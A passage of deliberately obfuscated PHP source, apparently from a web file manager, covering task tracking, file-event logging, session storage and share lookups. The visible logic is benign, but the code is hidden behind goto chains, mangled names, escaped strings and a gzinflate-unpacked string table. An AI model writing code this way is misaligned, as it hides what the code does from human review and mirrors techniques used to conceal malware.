$Bİ‰Šè£‚[$A®–ŠÖÈë¤[1104]] += $CÑÚÆöÉ’ô; self::valueSet($AÜˆÀâò…¯[$A®–ŠÖÈë¤[369]], $Bİ‰Šè£‚); sleep($CÑÚÆöÉ’ô); $this->update(); return; } } $AÜˆÀâò…¯[$A®–ŠÖÈë¤[447]] = $dâ®ë›”¯à ? $dâ®ë›”¯à : $AÜˆÀâò…¯[$A®–ŠÖÈë¤[447]]; $AÜˆÀâò…¯[$A®–ŠÖÈë¤[1104]] = $Bİ‰Šè£‚[$A®–ŠÖÈë¤[1104]] ? $Bİ‰Šè£‚[$A®–ŠÖÈë¤[1104]] : 0; goto eÆÚ²ïÁ¤°; fÚ¼ÍíÙ¼„: self::cacheClear(); $Bİ‰Šè£‚ = self::get($AÜˆÀâò…¯[$A®–ŠÖÈë¤[369]]); $dâ®ë›”¯à = $Bİ‰Šè£‚[$A®–ŠÖÈë¤[447]]; goto E”Şİ‚õ¥†; fËä³çê¿¤: $AÜˆÀâò…¯[$A®–ŠÖÈë¤[1098]] += $BÌÀî¤ÎÜ‰; $AÜˆÀâò…¯[$A®–ŠÖÈë¤[1102]] = timeFloat(); if ($AÜˆÀâò…¯[$A®–ŠÖÈë¤[1097]]) { $AàùÏÊÑï³ = timeFloat() - $AÜˆÀâò…¯[$A®–ŠÖÈë¤[1101]] - $AÜˆÀâò…¯[$A®–ŠÖÈë¤[1104]]; $AÜˆÀâò…¯[$A®–ŠÖÈë¤[1099]] = $AÜˆÀâò…¯[$A®–ŠÖÈë¤[1098]] / $AÜˆÀâò…¯[$A®–ŠÖÈë¤[1097]]; $AÜˆÀâò…¯[$A®–ŠÖÈë¤[1100]] = $AÜˆÀâò…¯[$A®–ŠÖÈë¤[1098]] / $AàùÏÊÑï³; if ($AÜˆÀâò…¯[$A®–ŠÖÈë¤[1099]] > 0) { $AÜˆÀâò…¯[$A®–ŠÖÈë¤[1105]] = $AàùÏÊÑï³ * (1 - $AÜˆÀâò…¯[$A®–ŠÖÈë¤[1099]]) / $AÜˆÀâò…¯[$A®–ŠÖÈë¤[1099]]; } } goto A†™¤æ¢À§; A†™¤æ¢À§: $this->updateAfter(); $E¼ÇŒ ãõ = 0.2; if (timeFloat() - $AÜˆÀâò…¯[$A®–ŠÖÈë¤[1103]] < $E¼ÇŒ ãõ) { return; } goto fÚ¼ÍíÙ¼„; b­³×¨®•»: $A®–ŠÖÈë¤ =& $_SERVER[İë¬“ÅÒÛ›]; $AÜˆÀâò…¯ =& $this->task; if (!$AÜˆÀâò…¯) { return; } goto fËä³çê¿¤; bƒè—’³İã: } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($bğµâ”«×¦) { $bù¹´ì©’ç =& $_SERVER[İë¬“ÅÒÛ›]; Cache::set($bù¹´ì©’ç[1114] . $this->task[$bù¹´ì©’ç[369]], $bğµâ”«×¦, 30); return $bğµâ”«×¦; } public static function get($C½£…ÕÚ) { return self::valueGet($C½£…ÕÚ); } public static function listData($DÍß³„¶î = false) { $aÙ©ª»»³í =& $_SERVER[İë¬“ÅÒÛ›]; $DÍ¦œöÓŠî = self::valueGet(); if ($DÍß³„¶î) { $DÍ¦œöÓŠî = array_filter_by_field($DÍ¦œöÓŠî, $aÙ©ª»»³í[1095], $DÍß³„¶î); } $DÍ¦œöÓŠî = array_sort_by($DÍ¦œöÓŠî, $aÙ©ª»»³í[1101], !0); return $DÍ¦œöÓŠî; } public static function kill($BÖ¥¢Â•ˆ‡) { return self::changeStatus($BÖ¥¢Â•ˆ‡, self::STATYS_KILL); } public static function stop($BùŞ˜‚Ø‚¶) { return self::changeStatus($BùŞ˜‚Ø‚¶, self::STATYS_STOP); } public static function restart($a…‡¼®ìó²) { return self::changeStatus($a…‡¼®ìó², self::STATYS_RUNNING); } public static function killAll() { $cÅŠîŒ¬´¡ =& $_SERVER[İë¬“ÅÒÛ›]; $cÖŒºì‹œÙ = self::listData(); foreach ($cÖŒºì‹œÙ as $d«¦”¦‹ë) { self::kill($d«¦”¦‹ë[$cÅŠîŒ¬´¡[369]]); } sleep(2); foreach ($cÖŒºì‹œÙ as $d«¦”¦‹ë) { self::valueSet($d«¦”¦‹ë[$cÅŠîŒ¬´¡[369]], !1); } } private static function changeStatus($CŸáø§•ùè, $DóÊ¸’©è„) { goto f†¯ğòŠ; EòŞ†˜š‰: return !0; goto D†¬è·–Ì™; f†¯ğòŠ: $eÄ“£¢ÉÛ‘ =& $_SERVER[İë¬“ÅÒÛ›]; $d¯¦ŸŒ‚·‘ = self::valueGet($CŸáø§•ùè); if (!$d¯¦ŸŒ‚·‘) { return !1; } goto A˜æËÌ½Â; A˜æËÌ½Â: $d¯¦ŸŒ‚·‘[$eÄ“£¢ÉÛ‘[447]] = $DóÊ¸’©è„; self::valueSet($CŸáø§•ùè, $d¯¦ŸŒ‚·‘); self::log($eÄ“£¢ÉÛ‘[1115] . $d¯¦ŸŒ‚·‘[$eÄ“£¢ÉÛ‘[369]] . $eÄ“£¢ÉÛ‘[1116] . $DóÊ¸’©è„); goto EòŞ†˜š‰; D†¬è·–Ì™: } public static function valueGet($CÑÄª‹¯Ãå = false) { $fèƒóç£÷Ì =& $_SERVER[İë¬“ÅÒÛ›]; $a·œ¤”à‚ = $fèƒóç£÷Ì[1117]; $fÙªšĞ¸ôè = Model($fèƒóç£÷Ì[1093])->get($CÑÄª‹¯Ãå, $a·œ¤”à‚); if ($CÑÄª‹¯Ãå) { $fÙªšĞ¸ôè = $fÙªšĞ¸ôè ? json_decode($fÙªšĞ¸ôè, !0) : !1; } else { $fÙªšĞ¸ôè = $fÙªšĞ¸ôè ? $fÙªšĞ¸ôè : array(); foreach ($fÙªšĞ¸ôè as $fÆ‰ªµš²É => $D¹°¢‘¤‹Ó) { $fÙªšĞ¸ôè[$fÆ‰ªµš²É] = json_decode($D¹°¢‘¤‹Ó, !0); } } return $fÙªšĞ¸ôè; } public static function valueSet($eÖÜ‚à´ˆç, $C¬öÛö›º) { goto b×Œô·‹ˆ»; b×Œô·‹ˆ»: $Eİ¶‹‘á =& $_SERVER[İë¬“ÅÒÛ›]; $fÙì™éŒ£ = $Eİ¶‹‘á[1117]; if (!$C¬öÛö›º) { return Model($Eİ¶‹‘á[1093])->remove($eÖÜ‚à´ˆç, $fÙì™éŒ£); } goto cÏÜ‚‰Ù…ß; cÏÜ‚‰Ù…ß: $EğÉ‘èØ˜İ = json_encode($C¬öÛö›º); if (!$EğÉ‘èØ˜İ) { ob_start(); var_dump($C¬öÛö›º); $B¯¶Í¼Ö–œ = ob_get_clean(); self::log($Eİ¶‹‘á[1118] . json_encode_force($B¯¶Í¼Ö–œ)); } if (!$eÖÜ‚à´ˆç || !$C¬öÛö›º[$Eİ¶‹‘á[369]]) { return !1; } goto C£˜œù‹Øó; C£˜œù‹Øó: return Model($Eİ¶‹‘á[1093])->set($eÖÜ‚à´ˆç, $EğÉ‘èØ˜İ, $fÙì™éŒ£); goto b§›•÷²¥; b§›•÷²¥: } public static function cacheClear() { $AÛ¤ôìŞ¼² =& $_SERVER[İë¬“ÅÒÛ›]; $E¬°²…Ñ = Model($AÛ¤ôìŞ¼²[1093])->cacheKey($AÛ¤ôìŞ¼²[1117]); Cache::clearMemory($E¬°²…Ñ); } public static function log($f¶éŒÊÌÑÙ) { write_log($f¶éŒÊÌÑÙ, $_SERVER[İë¬“ÅÒÛ›][1119]); } } goto d†‘¶²—µ; fÆ´ÍÄ°¸: class SourceEventModel extends ModelBase { protected $tableName = "\151\x6f\137\x73\157\165\162\x63\145\x5f\145\166\145\x6e\x74"; protected $dataAuto = array(array("\x63\162\145\141\164\x65\x54\x69\155\x65", "\x74\151\155\145", "\x69\x6e\x73\145\162\164", "\146\165\156\143\164\151\157\156"), array("\144\145\x73\143", '', "\x69\x6e\163\x65\162\x74\x2c\x75\x70\x64\141\x74\x65\x2c\163\x65\x6c\x65\x63\x74", "\x6a\163\157\x6e")); public function addEvent($a•îä‚Ï´‹, $fíÚ‚Âİ, $Bô‹è–ï× = '') { goto E¡ñÉÁ›è; b„ë¦Ñ²Ïİ: return $this->add($d «ÂšÌ–Á); goto F˜ªë•ËÖÑ; Fã­÷¡¦: if ($Bô‹è–ï× && is_string($Bô‹è–ï×)) { $Bô‹è–ï× = array($e…´‡Š’îÛ[1577] => $Bô‹è–ï×); } $d «ÂšÌ–Á = array($e…´‡Š’îÛ[416] => $a•îä‚Ï´‹, $e…´‡Š’îÛ[1721] => $câë¡ğŒ­…[$e…´‡Š’îÛ[385]], $e…´‡Š’îÛ[1086] => USER_ID, $e…´‡Š’îÛ[815] => $fíÚ‚Âİ, $e…´‡Š’îÛ[1088] => $Bô‹è–ï×); $this->addSystemLog($fíÚ‚Âİ, $d «ÂšÌ–Á); goto b„ë¦Ñ²Ïİ; E¡ñÉÁ›è: $e…´‡Š’îÛ =& $_SERVER[İë¬“ÅÒÛ›]; $câë¡ğŒ­… = Model($e…´‡Š’îÛ[855])->sourceInfo($a•îä‚Ï´‹); if (!$câë¡ğŒ­…) { return !1; } goto Fã­÷¡¦; F˜ªë•ËÖÑ: } private function addSystemLog($B¨×ø…è‹, $Dª“‹“ùí) { $DŸ³®™Öã‘ =& $_SERVER[İë¬“ÅÒÛ›]; if ($B¨×ø…è‹ == $DŸ³®™Öã‘[1722]) { $B¨×ø…è‹ = $Dª“‹“ùí[$DŸ³®™Öã‘[1590]][$DŸ³®™Öã‘[1723]]; } else { if (in_array($B¨×ø…è‹, array($DŸ³®™Öã‘[1523], $DŸ³®™Öã‘[1724]))) { $B¨×ø…è‹ = $Dª“‹“ùí[$DŸ³®™Öã‘[1590]][$DŸ³®™Öã‘[450]]; } } $Cá‚Œ®ë = array_merge($Dª“‹“ùí, array($DŸ³®™Öã‘[1725] => $Dª“‹“ùí[$DŸ³®™Öã‘[375]], $DŸ³®™Öã‘[1726] => $Dª“‹“ùí[$DŸ³®™Öã‘[1726]])); Model($DŸ³®™Öã‘[1487])->addLog($DŸ³®™Öã‘[1727] . $B¨×ø…è‹, $Cá‚Œ®ë); } public function eventCreate($aÚ÷òÅ¬¡, $E¿÷Íößß) { $A§ÂÇ»†ˆ =& $_SERVER[İë¬“ÅÒÛ›]; $EÆêí³ÎñÑ = Model($A§ÂÇ»†ˆ[855])->sourceInfo($aÚ÷òÅ¬¡); $A¦›­«°¥« = array($A§ÂÇ»†ˆ[1723] => $E¿÷Íößß, $A§ÂÇ»†ˆ[28] => $EÆêí³ÎñÑ[$A§ÂÇ»†ˆ[28]]); return $this->addEvent($aÚ÷òÅ¬¡, $A§ÂÇ»†ˆ[1722], $A¦›­«°¥«); } public function eventFileEdit($aè„‚ßÄÀ‰) { return $this->addEvent($aè„‚ßÄÀ‰, $_SERVER[İë¬“ÅÒÛ›][1515]); } public function eventRecycle($A‘Á‘áö‡°, $Dæ…Ã¤â¾) { return $this->addEvent($A‘Á‘áö‡°, $_SERVER[İë¬“ÅÒÛ›][1724], $Dæ…Ã¤â¾); } public function eventRemove($fã‡¸çÆ»§) { $EÄÚÊà³­½ =& $_SERVER[İë¬“ÅÒÛ›]; $EáØœÏªÁä = Model($EÄÚÊà³­½[855])->sourceInfo($fã‡¸çÆ»§); $DŞòíõÅ‹ = $EáØœÏªÁä[$EÄÚÊà³­½[28]]; return $this->addEvent($EáØœÏªÁä[$EÄÚÊà³­½[385]], $EÄÚÊà³­½[1514], $DŞòíõÅ‹); } public function eventShare($aãÀ•ê•…», $fÉ™½Š†œØ) { return $this->addEvent($aãÀ•ê•…», $_SERVER[İë¬“ÅÒÛ›][1523], $fÉ™½Š†œØ); } public function eventMove($dô˜Ó‹Ğ, $d«Ÿ¥ÏÌ, $C…ÄÜõ’·¥) { goto dŒ—Şİ»ã; CÊ©›Ã†Ÿ: $this->addEvent($dô˜Ó‹Ğ, $FĞáÒ›—Ÿà[745], $EÄ§Ï…¦ß¨); $BİØ÷¶ğÊ = $EÈ˜œùì“ö->sourceInfo($dô˜Ó‹Ğ); $EÄ§Ï…¦ß¨ = array($FĞáÒ›—Ÿà[375] => $BİØ÷¶ğÊ[$FĞáÒ›—Ÿà[375]], $FĞáÒ›—Ÿà[28] => $BİØ÷¶ğÊ[$FĞáÒ›—Ÿà[28]]); goto Aß¯¯Ù÷æ; dŒ—Şİ»ã: $FĞáÒ›—Ÿà =& $_SERVER[İë¬“ÅÒÛ›]; $EÈ˜œùì“ö = Model($FĞáÒ›—Ÿà[855]); $BİØ÷¶ğÊ = $EÈ˜œùì“ö->sourceInfo($dô˜Ó‹Ğ); goto c‚ôµ¥˜; c‚ôµ¥˜: $D´¡äÅ×éã = $EÈ˜œùì“ö->sourceInfo($d«Ÿ¥ÏÌ); $D‡ ÄÙñßÕ = $EÈ˜œùì“ö->sourceInfo($C…ÄÜõ’·¥); $EÄ§Ï…¦ß¨ = array($FĞáÒ›—Ÿà[755] => $d«Ÿ¥ÏÌ, $FĞáÒ›—Ÿà[1728] => $D´¡äÅ×éã[$FĞáÒ›—Ÿà[28]], $FĞáÒ›—Ÿà[756] => $C…ÄÜõ’·¥, $FĞáÒ›—Ÿà[1729] => $D‡ ÄÙñßÕ[$FĞáÒ›—Ÿà[28]]); goto CÊ©›Ã†Ÿ; Aß¯¯Ù÷æ: $this->addEvent($d«Ÿ¥ÏÌ, $FĞáÒ›—Ÿà[1730], $EÄ§Ï…¦ß¨); goto B¹¾–›‡‹; B¹¾–›‡‹: } public function eventCopy($CŸ”ÇÒøƒ) { $this->eventCreate($CŸ”ÇÒøƒ, $_SERVER[İë¬“ÅÒÛ›][744]); } public function eventRename($c³„§ĞÇ, $bîÈÌÒ½ø, $c—”¹¦²Ÿç) { $dË¼ŒÇœƒå =& $_SERVER[İë¬“ÅÒÛ›]; $F§¤çíŠ§™ = array($dË¼ŒÇœƒå[755] => $bîÈÌÒ½ø, $dË¼ŒÇœƒå[756] => $c—”¹¦²Ÿç); return $this->addEvent($c³„§ĞÇ, $dË¼ŒÇœƒå[867], $F§¤çíŠ§™); } public function eventAddComment($fÙĞØá’, $fÂÊÂŠë¸‹) { return $this->addEvent($fÙĞØá’, $_SERVER[İë¬“ÅÒÛ›][1731], $fÂÊÂŠë¸‹); } public function eventAddDesc($fÊ¢È£‹¶Å, $BĞá„±ÃÃ) { return $this->addEvent($fÊ¢È£‹¶Å, $_SERVER[İë¬“ÅÒÛ›][1732], $BĞá„±ÃÃ); } public function listBySource($AÚ—Óù®Œ°) { goto CŸÃ³ÎÎ°; a†İ‹ˆ¢à: $fòÒÛ¸åÕæ = $this->eventListParse($fòÒÛ¸åÕæ, $AÚ—Óù®Œ°); show_json($fòÒÛ¸åÕæ); goto dµòœ²ªË±; CŸÃ³ÎÎ°: $b Â‰Ú— =& $_SERVER[İë¬“ÅÒÛ›]; $AÂ‘‰¶ƒ¸Ó = Model($b Â‰Ú—[855])->sourceInfo($AÚ—Óù®Œ°); $aƒï£áç„å = array($b Â‰Ú—[416] => $AÚ—Óù®Œ°); goto D§¬ÁŠ¢²; D§¬ÁŠ¢²: if ($AÂ‘‰¶ƒ¸Ó[$b Â‰Ú—[376]] == $b Â‰Ú—[377]) { $A–ÖèÙ´† = Model($b Â‰Ú—[855])->listSearchChildren($AÚ—Óù®Œ°, 20000); $A–ÖèÙ´†[] = $AÚ—Óù®Œ°; $aƒï£áç„å = array($b Â‰Ú—[375] => array($b Â‰Ú—[7], $A–ÖèÙ´†)); } $fòÒÛ¸åÕæ = $this->where($aƒï£áç„å)->order($b Â‰Ú—[1733])->selectPage(); if ($fòÒÛ¸åÕæ[$b Â‰Ú—[354]][$b Â‰Ú—[355]] == 0) { $fòÒÛ¸åÕæ[$b Â‰Ú—[354]][$b Â‰Ú—[355]] = 1; $fòÒÛ¸åÕæ[$b Â‰Ú—[357]] = array(array($b Â‰Ú—[416] => $AÚ—Óù®Œ°, $b Â‰Ú—[1721] => $AÂ‘‰¶ƒ¸Ó[$b Â‰Ú—[385]], $b Â‰Ú—[1086] => $AÂ‘‰¶ƒ¸Ó[$b Â‰Ú—[1734]], $b Â‰Ú—[815] => $b Â‰Ú—[1735], $b Â‰Ú—[1587] => $AÂ‘‰¶ƒ¸Ó[$b Â‰Ú—[187]], $b Â‰Ú—[1088] => $b Â‰Ú—[33])); } goto a†İ‹ˆ¢à; dµòœ²ªË±: } private function eventListParse($AÌËè‹‹ç¹, $e¡êÂëö¢Ø) { goto dÙÖ÷Ô•©È; c–äÎæïÇ’: return $AÌËè‹‹ç¹; goto cÓ¡†—‘; D•Û Õñ»‡: $d“¶ëí¢˜ = array_unique($d“¶ëí¢˜); $cŞ„ëÂã›Â = array_unique(array_to_keyvalue($eÚ—Óè®á, $fÜœƒ’‡æÜ[33], $fÜœƒ’‡æÜ[1095])); $bß¢˜×ªŠ = Model($fÜœƒ’‡æÜ[1481])->userListInfo($cŞ„ëÂã›Â); goto f®öã¿Ùî†; bœëö¢ø×¼: $d·ÛÏ¥Ñš = array_to_keyvalue($eÚ—Óè®á, $fÜœƒ’‡æÜ[33], $fÜœƒ’‡æÜ[1726]); foreach ($eÚ—Óè®á as $e»ŞË‘¥•) { $aƒÜ×Ä¶‚Ê = $e»ŞË‘¥•[$fÜœƒ’‡æÜ[1590]]; if ($e»ŞË‘¥•[$fÜœƒ’‡æÜ[29]] == $fÜœƒ’‡æÜ[745] && isset($aƒÜ×Ä¶‚Ê[$fÜœƒ’‡æÜ[755]])) { $d“¶ëí¢˜[] = $aƒÜ×Ä¶‚Ê[$fÜœƒ’‡æÜ[755]]; $d“¶ëí¢˜[] = $aƒÜ×Ä¶‚Ê[$fÜœƒ’‡æÜ[756]]; } if ($e»ŞË‘¥•[$fÜœƒ’‡æÜ[29]] == $fÜœƒ’‡æÜ[1730] && isset($aƒÜ×Ä¶‚Ê[$fÜœƒ’‡æÜ[375]])) { $d“¶ëí¢˜[] = $aƒÜ×Ä¶‚Ê[$fÜœƒ’‡æÜ[375]]; } } $d“¶ëí¢˜ = array_merge($d“¶ëí¢˜, $d·ÛÏ¥Ñš, array($e¡êÂëö¢Ø)); goto D•Û Õñ»‡; f®öã¿Ùî†: $D¥è¢àÔ®» = Model($fÜœƒ’‡æÜ[522])->sourceListInfo($d“¶ëí¢˜, !0); foreach ($eÚ—Óè®á as &$e»ŞË‘¥•) { goto F©ğ…‡ÃƒÔ; B÷Á„¯ŠÑ: $e»ŞË‘¥•[$fÜœƒ’‡æÜ[1688]] = $bß¢˜×ªŠ[$e»ŞË‘¥•[$fÜœƒ’‡æÜ[1095]]]; goto B¡ï¿õÒ”; F©ğ…‡ÃƒÔ: $aƒÜ×Ä¶‚Ê =& $e»ŞË‘¥•[$fÜœƒ’‡æÜ[1590]]; if ($e»ŞË‘¥•[$fÜœƒ’‡æÜ[29]] == $fÜœƒ’‡æÜ[745] && isset($aƒÜ×Ä¶‚Ê[$fÜœƒ’‡æÜ[755]])) { $aƒÜ×Ä¶‚Ê[$fÜœƒ’‡æÜ[755]] = $D¥è¢àÔ®»[$aƒÜ×Ä¶‚Ê[$fÜœƒ’‡æÜ[755]]]; $aƒÜ×Ä¶‚Ê[$fÜœƒ’‡æÜ[756]] = $D¥è¢àÔ®»[$aƒÜ×Ä¶‚Ê[$fÜœƒ’‡æÜ[756]]]; } if ($e»ŞË‘¥•[$fÜœƒ’‡æÜ[29]] == $fÜœƒ’‡æÜ[1730] && isset($aƒÜ×Ä¶‚Ê[$fÜœƒ’‡æÜ[375]])) { $aƒÜ×Ä¶‚Ê[$fÜœƒ’‡æÜ[375]] = $D¥è¢àÔ®»[$aƒÜ×Ä¶‚Ê[$fÜœƒ’‡æÜ[375]]]; } goto EÈŠ²ÜÖÄ½; EÈŠ²ÜÖÄ½: $e»ŞË‘¥•[$fÜœƒ’‡æÜ[861]] = $D¥è¢àÔ®»[$e»ŞË‘¥•[$fÜœƒ’‡æÜ[375]]]; $e»ŞË‘¥•[$fÜœƒ’‡æÜ[1736]] = $D¥è¢àÔ®»[$e»ŞË‘¥•[$fÜœƒ’‡æÜ[1726]]]; if ($e»ŞË‘¥•[$fÜœƒ’‡æÜ[29]] == $fÜœƒ’‡æÜ[1514]) { $e»ŞË‘¥•[$fÜœƒ’‡æÜ[1736]] = $e»ŞË‘¥•[$fÜœƒ’‡æÜ[861]]; $e»ŞË‘¥•[$fÜœƒ’‡æÜ[1726]] = $e»ŞË‘¥•[$fÜœƒ’‡æÜ[1736]][$fÜœƒ’‡æÜ[375]]; $e»ŞË‘¥•[$fÜœƒ’‡æÜ[861]] = !1; $e»ŞË‘¥•[$fÜœƒ’‡æÜ[375]] = $fÜœƒ’‡æÜ[33]; } goto B÷Á„¯ŠÑ; B¡ï¿õÒ”: } $AÌËè‹‹ç¹[$fÜœƒ’‡æÜ[357]] = $eÚ—Óè®á; goto c–äÎæïÇ’; dÙÖ÷Ô•©È: $fÜœƒ’‡æÜ =& $_SERVER[İë¬“ÅÒÛ›]; $eÚ—Óè®á = $AÌËè‹‹ç¹[$fÜœƒ’‡æÜ[357]]; $d“¶ëí¢˜ = array_to_keyvalue($eÚ—Óè®á, $fÜœƒ’‡æÜ[33], $fÜœƒ’‡æÜ[375]); goto bœëö¢ø×¼; cÓ¡†—‘: } public function removeBySource($föŸÄøàŠ) { $CÌß·¿ÆÑö = array($_SERVER[İë¬“ÅÒÛ›][416] => $föŸÄøàŠ); $this->where($CÌß·¿ÆÑö)->remove(); } } define($_SERVER[İë¬“ÅÒÛ›][1737], $_SERVER[İë¬“ÅÒÛ›][1738]); $_SERVER[æ ] = explode($_SERVER[İë¬“ÅÒÛ›][1739], gzinflate(substr($_SERVER[İë¬“ÅÒÛ›][1740], 10, -8))); goto aÊòËï¢ƒâ; B“Í¤ô²±Ö: class SessionModel extends ModelBase { protected $tableName = "\163\x79\x73\164\145\x6d\137\x73\145\163\x73\151\x6f\156"; public function get($E˜Ô˜Éƒ°) { $eÄøñÊ¤´÷ =& $_SERVER[İë¬“ÅÒÛ›]; $Cê«ñË ´ = $this->where(array($eÄøñÊ¤´÷[1653] => $E˜Ô˜Éƒ°))->find(); if (!is_array($Cê«ñË ´)) { return !1; } return $Cê«ñË ´[$eÄøñÊ¤´÷[450]]; } public function set($E¿ˆÇÍòˆ, $aÉôÙ±Î® , $Dœ‰Îå— = 3600) { $eí³›ÏÔ‹ =& $_SERVER[İë¬“ÅÒÛ›]; $fŒÂİêÊñ˜ = array($eí³›ÏÔ‹[1653] => $E¿ˆÇÍòˆ, $eí³›ÏÔ‹[1577] => $aÉôÙ±Î® , $eí³›ÏÔ‹[1654] => $Dœ‰Îå— + time()); if (Session::get($eí³›ÏÔ‹[1655])) { $fŒÂİêÊñ˜[$eí³›ÏÔ‹[1095]] = Session::get($eí³›ÏÔ‹[1655]); } else { $fŒÂİêÊñ˜[$eí³›ÏÔ‹[1095]] = 0; } if ($this->get($E¿ˆÇÍòˆ)) { return $this->where(array($eí³›ÏÔ‹[1653] => $E¿ˆÇÍòˆ))->save($fŒÂİêÊñ˜); } else { return $this->add($fŒÂİêÊñ˜, array(), !0); } } public function remove($BƒŸô˜î“) { return $this->where(array($_SERVER[İë¬“ÅÒÛ›][1653] => $BƒŸô˜î“))->delete(); } public function clearTimeout() { return $this->where($_SERVER[İë¬“ÅÒÛ›][1656] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\163\150\141\162\x65"; protected $dataAuto = array(array("\x6d\157\x64\x69\146\171\124\x69\x6d\145", "\x74\151\x6d\145", "\x69\x6e\163\145\x72\x74\54\165\160\x64\x61\x74\145", "\x66\x75\156\x63\x74\x69\x6f\x6e"), array("\143\x72\145\141\x74\x65\124\151\x6d\x65", "\x74\x69\x6d\x65", "\151\156\163\145\x72\164", "\146\x75\x6e\x63\164\x69\157\x6e"), array("\157\160\x74\151\157\x6e\x73", '', "\151\x6e\163\145\x72\x74\x2c\165\160\x64\x61\164\x65\54\x73\x65\154\145\x63\164", "\152\163\157\156")); private $fieldList = "\x2a"; protected function cacheFunctionAlias($B¼­®—øìÀ) { $C›¶ŞÅ³š =& $_SERVER[İë¬“ÅÒÛ›]; $AÌ˜ø»«Ê  = isset($B¼­®—øìÀ[0]) ? $B¼­®—øìÀ[0] : !1; return array($C›¶ŞÅ³š[1657] => array(USER_ID, $C›¶ŞÅ³š[1658]), $C›¶ŞÅ³š[1624] => array($AÌ˜ø»«Ê , $C›¶ŞÅ³š[1659])); } protected function listSimple() { $E¼—Å®ñª— = array($_SERVER[İë¬“ÅÒÛ›][1095] => USER_ID); $B©Ó±ÜåŸ = $this->field($this->fieldList)->where($E¼—Å®ñª—)->select(); return $B©Ó±ÜåŸ ? $B©Ó±ÜåŸ : array(); } protected function getInfo($f¤¦¾…ì½Å, $AŸ†ª®Ìğö = false) { $CàÅ…á¨ =& $_SERVER[İë¬“ÅÒÛ›]; if ($AŸ†ª®Ìğö) { return $this->_getShareInfo(array($CàÅ…á¨[420] => $f¤¦¾…ì½Å)); } $DğÚŸ¢íÓÖ = $this->cacheFunctionGet($CàÅ…á¨[1660], $f¤¦¾…ì½Å); return $DğÚŸ¢íÓÖ; } public function getInfoByHash($EÖÌÙò“‚È) { return $this->_getShareInfo(array($_SERVER[İë¬“ÅÒÛ›][1661] => $EÖÌÙò“‚È)); } public function getInfoByPath($e‘ÄàÀƒÙ) { $D»ğº¾¬î¹ =& $_SERVER[İë¬“ÅÒÛ›]; $Dòìˆ–Ö = array($D»ğº¾¬î¹[1095] => USER_ID, $D»ğº¾¬î¹[375] => $e‘ÄàÀƒÙ); return $this->_getShareInfo($Dòìˆ–Ö); } public function getInfoBySourcePath($A¬ŒÉ³ˆ›”) { $bê¹ƒ½¾–» =& $_SERVER[İë¬“ÅÒÛ›]; $b„Ã—¼“ô = array($bê¹ƒ½¾–»[1095] => USER_ID, $bê¹ƒ½¾–»[767] => $A¬ŒÉ³ˆ›”); return $this->_getShareInfo($b„Ã—¼“ô); } private function _getShareInfo($Bë‹„…»°) { goto A‰Óù¢£¿; A‰Óù¢£¿: $A‘ææ†­Ú§ =& $_SERVER[İë¬“ÅÒÛ›]; $fºÚ‡´·Í“ = $this->where($Bë‹„…»°)->find(); if (!$fºÚ‡´·Í“) { return !1; } goto CãÕëÔœŒ¦; CãÕëÔœŒ¦: $Bë‹„…»° = array($A‘ææ†­Ú§[420] => $fºÚ‡´·Í“[$A‘ææ†­Ú§[420]]); $e…ïÁ’¤°Ç = $A‘ææ†­Ú§[1662]; $DŞïšîùã = Model($A‘ææ†­Ú§[421])->order($A‘ææ†­Ú§[369])->field($e…ïÁ’¤°Ç)->where($Bë‹„…»°)->select(); goto e¶òŸÄô»œ; e¶òŸÄô»œ: if ($fºÚ‡´·Í“[$A‘ææ†­Ú§[375]] == $A‘ææ†­Ú§[403]) { $fºÚ‡´·Í“[$A‘ææ†­Ú§[861]] = IO::info($fºÚ‡´·Í“[$A‘ææ†­Ú§[767]]); } else { $fºÚ‡´·Í“[$A‘ææ†­Ú§[861]] = Model($A‘ææ†­Ú§[855])->pathInfo($fºÚ‡´·Í“[$A‘ææ†­Ú§[375]]); } $fºÚ‡´·Í“[$A‘ææ†­Ú§[1663]] = $DŞïšîùã; return $fºÚ‡´·Í“; goto B§‚‰§®òÚ; B§‚‰§®òÚ: } protected function getInfoAuth($BÓ Š³¼ãÙ) { $eÙ¾Ó¼­£‰ =& $_SERVER[İë¬“ÅÒÛ›]; $Aß¾²‡Âİ = $this->getInfo($BÓ Š³¼ãÙ); $Aß¾²‡Âİ[$eÙ¾Ó¼­£‰[550]] = Model($eÙ¾Ó¼­£‰[414])->authMake($Aß¾²‡Âİ[$eÙ¾Ó¼­£‰[1663]]); return $Aß¾²‡Âİ; } protected function listData($Aáá®®ÜŞœ = null, $b’‡½ÊßïÜ = 300) { $eê„öô‘ =& $_SERVER[İë¬“ÅÒÛ›]; $cÜÃ„Ü¶ÙÑ = array(array($eê„öô‘[1664] => array($eê„öô‘[696], 0), $eê„öô‘[418] => array($eê„öô‘[696], 0), $eê„öô‘[1665] => $eê„öô‘[1639])); if ($Aáá®®ÜŞœ == $eê„öô‘[1297]) { $cÜÃ„Ü¶ÙÑ = array($eê„öô‘[1664] => 1); } else { if ($Aáá®®ÜŞœ == $eê„öô‘[756]) { $cÜÃ„Ü¶ÙÑ = array($eê„öô‘[418] => 1); } } $cÜÃ„Ü¶ÙÑ[$eê„öô‘[1095]] = USER_ID; $CÓ¶·ß¸„ù = $this->where($cÜÃ„Ü¶ÙÑ)->selectPage($b’‡½ÊßïÜ); return $CÓ¶·ß¸„ù; } protected function listToMe($f„á×îİØ™ = 300) { goto e–°‰Ì¬óØ; e–°‰Ì¬óØ: $EÁ²İ‹ÇÉ =& $_SERVER[İë¬“ÅÒÛ›]; $a—Å¾ïÛå = Session::get($EÁ²İ‹ÇÉ[1666]); $F¦Úç’æˆÀ = array_to_keyvalue($a—Å¾ïÛå, $EÁ²İ‹ÇÉ[33], $EÁ²İ‹ÇÉ[1546]); goto DŒã‹ôò¿‚; eÍ˜±¹ùÉƒ: $eˆÒ‚‡áù° = array_to_keyvalue_group($C´‰À—Ââ§[$EÁ²İ‹ÇÉ[357]], $EÁ²İ‹ÇÉ[420]); if (!$eˆÒ‚‡áù°) { return $C´‰À—Ââ§; } $b‚Ü¨îİ¼Œ = $EÁ²İ‹ÇÉ[1667]; goto Aê¹ÔÕ¿×; Aê¹ÔÕ¿×: $bî»¢‡°† = array($EÁ²İ‹ÇÉ[420] => array($EÁ²İ‹ÇÉ[983], array_keys($eˆÒ‚‡áù°))); $fğİä…ª– = $this->field($b‚Ü¨îİ¼Œ)->where($bî»¢‡°†)->select(); foreach ($fğİä…ª– as $Cš÷§Æ‹İ => &$F² 